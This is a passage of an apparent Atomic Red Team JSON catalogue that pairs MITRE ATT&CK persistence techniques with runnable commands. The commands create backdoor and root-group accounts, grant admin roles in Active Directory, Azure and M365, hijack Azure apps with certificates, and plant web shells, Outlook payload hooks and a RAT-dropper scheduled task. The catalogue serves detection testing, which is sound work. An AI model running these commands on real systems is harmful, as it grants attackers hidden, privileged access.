         "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"UpperLowerLong333noSpecialChar\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString UpperLowerLong333noSpecialChar -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong333noSpecialChar\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong333noSpecialChar\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
         "command": "if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"; $cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"};  ;  $credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq \"UPPER-LONG-SPECIAL-333\"){;       Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString UPPER-LONG-SPECIAL-333 -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host \"Error code: $errCode\";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan \"Successfully changed the password to UPPER-LONG-SPECIAL-333\";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UPPER-LONG-SPECIAL-333\" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"; }"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n",
         "command": "Try {;     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;      ; } ; Catch {;     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  $x = Get-Random -Minimum 2 -Maximum 99; $y = Get-Random -Minimum 2 -Maximum 99; $z = Get-Random -Minimum 2 -Maximum 99; $w = Get-Random -Minimum 2 -Maximum 99; Import-Module ActiveDirectory; $account = \"#{account_prefix}-$x$y$z\"; New-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False; Add-ADGroupMember \"#{group}\" $account"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account\n",
         "command": "ntdsutil \"set dsrm password\" \"sync from domain account %username%\" \"q\" \"q\""
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "The adversaries want to add user to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to the user principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see User as a type.\n",
         "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $user = Get-AzureADUser -Filter \"DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'\"; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId; Write-Host \"User $($user.DisplayName) was added to $($role.DisplayName) role\""
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.\nThis technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: \"Get-AzureADApplication\" instead of \"New-AzureADServicePrincipal\".\nThe DirectoryRecommendations.Read.All permissions has been selected as the default.\n\nThe account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.\n\nDetection hint - check Operation Name \"Add app role assignment to service principal\" in subscriptions Activity Logs.\nYou can also take a look at the materials:\nhttps://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/\nhttps://github.com/reprise99/Sentinel-Queries\nhttps://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766\nhttps://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb\n",
         "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $aadApplication = New-AzureADApplication -DisplayName \"test_app\"; $servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId; $graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"; $requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess; $requiredGraphAccess.ResourceAppId = $graphSP.AppId; $requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]; $ApplicationPermissions = @('DirectoryRecommendations.Read.All'); $reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}; if($reqPermission); {; $resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess; $resourceAccess.Type = \"Role\"; $resourceAccess.Id = $reqPermission.Id    ; $requiredGraphAccess.ResourceAccess.Add($resourceAccess); }; else; {; Write-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red; }; $requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]; $requiredResourcesAccess.Add($requiredGraphAccess); Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess; $servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"; New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id"
      },
      {
         "technique_id": "T1098",
         "technique_name": "Account Manipulation",
         "tactic": "persistence",
         "description": "The adversaries want to add user to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to user in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n",
         "command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name Az.Resources -Force};  ;  Import-Module -Name Az.Resources; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzAccount -Credential $Credential; $user = Get-AzADUser | where-object {$_.DisplayName -eq \"SuperUser\" -or $_.UserPrincipalName -eq \"SuperUser\" }; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"}; if ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription; Write-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\""
      }
   ],
   "T1136.001": [
      {
         "technique_id": "T1136.001",
         "technique_name": "Create Account: Local Account",
         "tactic": "persistence",
         "description": "Create a user via useradd\n",
         "command": "useradd -M -N -r -s /bin/bash -c evil_account evil_user"
      },
      {
         "technique_id": "T1136.001",
         "technique_name": "Create Account: Local Account",
         "tactic": "persistence",
         "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n",
         "command": "net user /add \"T1136.001_CMD\" \"T1136.001_CMD!\""
      },
      {
         "technique_id": "T1136.001",
         "technique_name": "Create Account: Local Account",
         "tactic": "persistence",
         "description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
         "command": "useradd -g 0 -M -d /root -s /bin/bash butter; if [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"butter:BetterWithButter\" | sudo chpasswd; else echo \"BetterWithButter\" | passwd --stdin butter; fi; "
      },
      {
         "technique_id": "T1136.001",
         "technique_name": "Create Account: Local Account",
         "tactic": "persistence",
         "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n",
         "command": "New-LocalUser -Name \"T1136.001_PowerShell\" -NoPassword"
      },
      {
         "technique_id": "T1136.001",
         "technique_name": "Create Account: Local Account",
         "tactic": "persistence",
         "description": "Creates a new admin user in a command prompt.\n",
         "command": "net user /add \"#{username}\" \"#{password}\" && net localgroup administrators \"#{username}\" /add"
      },
      {
         "technique_id": "T1136.001",
         "technique_name": "Create Account: Local Account",
         "tactic": "persistence",
         "description": "Creates a user on a MacOS system with dscl\n",
         "command": "dscl . -create /Users/evil_user; dscl . -create /Users/evil_user UserShell /bin/zsh; dscl . -create /Users/evil_user RealName \"Evil Account\"; dscl . -create /Users/evil_user UniqueID \"1010\"; dscl . -create /Users/evil_user PrimaryGroupID 80; dscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user"
      }
   ],
   "T1098.003": [
      {
         "technique_id": "T1098.003",
         "technique_name": "Account Manipulation: Additional Cloud Roles",
         "tactic": "persistence",
         "description": "This test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.\n Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges\n",
         "command": "Import-Module MSOnline; Import-Module AzureAD; $password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $password; $targetsecurepw = ConvertTo-SecureString -String \"Ohn05GeMe#$\" -AsPlainText -Force; Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue; Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue; $target_objid = Get-AzureADUser -filter \"userPrincipalName eq 'default'\" | Select-Object -ExpandProperty ObjectId; Set-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue; Add-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"default\"; Add-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberEmailAddress \"default\""
      },
      {
         "technique_id": "T1098.003",
         "technique_name": "Account Manipulation: Additional Cloud Roles",
         "tactic": "persistence",
         "description": "Add an existing Azure user account the Company Administrator Role.\n",
         "command": "Import-Module MSOnline; $Password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Password; Connect-MsolService -Credential $Credential; Add-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"default\""
      }
   ],
   "T1505.003": [
      {
         "technique_id": "T1505.003",
         "technique_name": "Server Software Component: Web Shell",
         "tactic": "persistence",
         "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n",
         "command": "xcopy /I /Y \"PathToAtomicsFolder\\T1505.003\\src\" C:\\inetpub\\wwwroot"
      }
   ],
   "T1098.004": [
      {
         "technique_id": "T1098.004",
         "technique_name": "SSH Authorized Keys",
         "tactic": "persistence",
         "description": "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. \nIf the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.\n",
         "command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi; "
      }
   ],
   "T1505.002": [
      {
         "technique_id": "T1505.002",
         "technique_name": "Server Software Component: Transport Agent",
         "tactic": "persistence",
         "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n",
         "command": "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll; Enable-TransportAgent Security Interop Agent; Get-TransportAgent | Format-List Name,Enabled"
      }
   ],
   "T1098.001": [
      {
         "technique_id": "T1098.001",
         "technique_name": "Account Manipulation: Additional Cloud Credentials",
         "tactic": "persistence",
         "description": "Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
         "command": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential > $null; $app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1; if ($app -eq $null) { Write-Warning \"Application not found\"; exit }; $credNotAfter = (Get-Date).AddDays(1); $certNotAfter = (Get-Date).AddDays(2); $cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter; $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData()); Write-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"; New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter; Start-Sleep -s 30; $tenant = Get-AzureADTenantDetail; $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint; Write-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"; Write-Host \"End of Hijacking\""
      },
      {
         "technique_id": "T1098.001",
         "technique_name": "Account Manipulation: Additional Cloud Credentials",
         "tactic": "persistence",
         "description": "Adversaries create their own new access and secret keys to programatically interact with AWS environment, which is already compromised\n",
         "command": "aws iam create-access-key --user-name atomicredteam > \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\"; cd \"$PathToAtomicsFolder/T1098.001/bin/\"; ./aws_secret.sh"
      },
      {
         "technique_id": "T1098.001",
         "technique_name": "Account Manipulation: Additional Cloud Credentials",
         "tactic": "persistence",
         "description": "Add a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
         "command": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential > $null; $sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $credNotAfter = (Get-Date).AddDays(1); $certNotAfter = (Get-Date).AddDays(2); $cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter; $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData()); Write-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"; New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter; Start-Sleep -s 30; $tenant = Get-AzureADTenantDetail; $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint; Write-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"; Write-Host \"End of Hijacking\""
      }
   ],
   "T1136.003": [
      {
         "technique_id": "T1136.003",
         "technique_name": "Create Account: Cloud Account",
         "tactic": "persistence",
         "description": "Creates a new IAM user in AWS. Upon successful creation, a new user will be created. Adversaries create new IAM users so that their malicious activity do not interupt the normal functions of the compromised users and can remain undetected for a long time\n",
         "command": "aws iam create-user --user-name atomicredteam"
      },
      {
         "technique_id": "T1136.003",
         "technique_name": "Create Account: Cloud Account",
         "tactic": "persistence",
         "description": "Creates a new user in Azure AD. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
         "command": "Connect-AzureAD; $userprincipalname = \"atomicredteam@yourdomain.com\"; $username = \"atomicredteam\"      ; $password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"; $PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile; $PasswordProfile.Password = $password; New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username"
      },
      {
         "technique_id": "T1136.003",
         "technique_name": "Create Account: Cloud Account",
         "tactic": "persistence",
         "description": "Creates a new user in Azure AD via the Azure CLI. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
         "command": "az login; $userprincipalname = \"atomicredteam@yourdomain.com\"; $username = \"atomicredteam\"      ; $password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"; az ad user create --display-name $username --password $password --user-principal-name $userprincipalname; az ad user list --filter \"displayname eq 'atomicredteam'\""
      }
   ],
   "T1176": [
      {
         "technique_id": "T1176",
         "technique_name": "Browser Extensions",
         "tactic": "persistence",
         "description": "This test loads an unpacked extension in Google Chrome with the `--load-extension` parameter. This technique was previously used by the Grandoreiro malware to load a malicious extension that would capture the browsing history, steal cookies and other user information. Other malwares also leverage this technique to hijack searches, steal passwords, inject ads, and more.\n\nReferences:\nhttps://attack.mitre.org/techniques/T1176/\nhttps://securityintelligence.com/posts/grandoreiro-malware-now-targeting-banks-in-spain/",
         "command": "$chromium =  \"https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip\"; $extension = \"https://github.com/gorhill/uBlock/releases/download/uBOLite_0.1.23.6055/uBOLite_0.1.23.6055.chromium.mv3.zip\"; Set-Location \"$env:TEMP\"; Set-Variable ProgressPreference SilentlyContinue; Invoke-WebRequest -URI $chromium -OutFile \"$env:TEMP\\chrome.zip\"; Invoke-WebRequest -URI $extension -OutFile \"$env:TEMP\\extension.zip\"; Expand-Archive chrome.zip -DestinationPath \"$env:TEMP\" -Force; Expand-Archive extension.zip -Force; Start-Process .\\chrome-win\\chrome.exe --load-extension=\"$env:TEMP\\extension\\\" -PassThru"
      }
   ],
   "T1137.004": [
      {
         "technique_id": "T1137.004",
         "technique_name": "Office Application Startup: Outlook Home Page",
         "tactic": "persistence",
         "description": "This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.\n\nTriggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).\n",
         "command": "reg.exe add HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\WebView\\Inbox /v URL /t REG_SZ /d file://d43bfc_T1137.004.html /f"
      }
   ],
   "T1098.002": [
      {
         "technique_id": "T1098.002",
         "technique_name": "Account Manipulation: Additional Email Delegate Permissions",
         "tactic": "persistence",
         "description": "Give a nominated user, full mailbox delegation access of another user.\nThis can be used by an adversary to maintain persistent access to a target's mailbox in M365.\n",
         "command": "Import-Module ExchangeOnlineManagement; $secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test@contoso.com\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Add-MailboxPermission -Identity \"delegate@contoso.com\" -User \"operator@contoso.com\" -AccessRights FullAccess -InheritanceType All; Disconnect-ExchangeOnline -Confirm:$false"
      }
   ],
   "T1505.004": [
      {
         "technique_id": "T1505.004",
         "technique_name": "IIS Components",
         "tactic": "persistence",
         "description": "The following Atomic will utilize PowerShell Cmdlet New-WebGlobalModule to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using New-WebGlobalModule.\n[Managing IIS Modules with PowerShell](https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n",
         "command": "New-WebGlobalModule -Name DefaultDocumentModule_Atomic -Image %windir%\\system32\\inetsrv\\defdoc.dll"
      },
      {
         "technique_id": "T1505.004",
         "technique_name": "IIS Components",
         "tactic": "persistence",
         "description": "The following Atomic will utilize AppCmd.exe to install a new IIS Module. IIS must be installed.\nThis atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).\nA successful execution will install a module into IIS using AppCmd.exe.\n[Managing and installing Modules Reference](https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview#to-install-a-module-using-appcmdexe)\n[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)\n",
         "command": "%windir%\\system32\\inetsrv\\appcmd.exe install module /name:DefaultDocumentModule_Atomic /image:%windir%\\system32\\inetsrv\\defdoc.dll"
      }
   ],
   "T1137": [
      {
         "technique_id": "T1137",
         "technique_name": "Office Application Startup",
         "tactic": "persistence",
         "description": "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ \nit is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.\nToo achieve this two things must happened on the syste\n- The macro security registry value must be set to '4'\n- A file called VbaProject.OTM must be created in the Outlook Folder.\n",
         "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /d 1 /f && mkdir  %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1 && echo \"Atomic Red Team TEST\" > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM"
      }
   ],
   "T1505.005": [
      {
         "technique_id": "T1505.005",
         "technique_name": "Server Software Component: Terminal Services DLL",
         "tactic": "persistence",
         "description": "Simulates patching of termsrv.dll by making a benign change to the file and replacing it with the original afterwards.\nBefore we can make the modifications we need to take ownership of the file and grant ourselves the necessary permissions.\n",
         "command": "$ACL = Get-Acl $fileName; $permission = \"Administrators\",\"FullControl\",\"Allow\"; $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission; $ACL.SetAccessRule($accessRule); Set-Acl -Path $fileName -AclObject $ACL; Copy-Item -Path \"C:\\Windows\\System32\\termsrv.dll\" -Destination \"C:\\Windows\\System32\\termsrv_backup.dll\" -ErrorAction Ignore; Add-Content -Path \"C:\\Windows\\System32\\termsrv.dll\" -Value \"`n\" -NoNewline -ErrorAction Ignore; Move-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore"
      }
   ],
   "T1195": [
      {
         "technique_id": "T1195",
         "technique_name": "Supply Chain Compromise",
         "tactic": "initial-access",
         "description": "This test simulates an adversary Octopus drop the RAT dropper ExplorerSync.db\n[octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)\n[the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)\n",
         "command": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db && schtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f"
      }
   ],
   "T1566.001": [
      {
         "technique_id": "T1566.001",
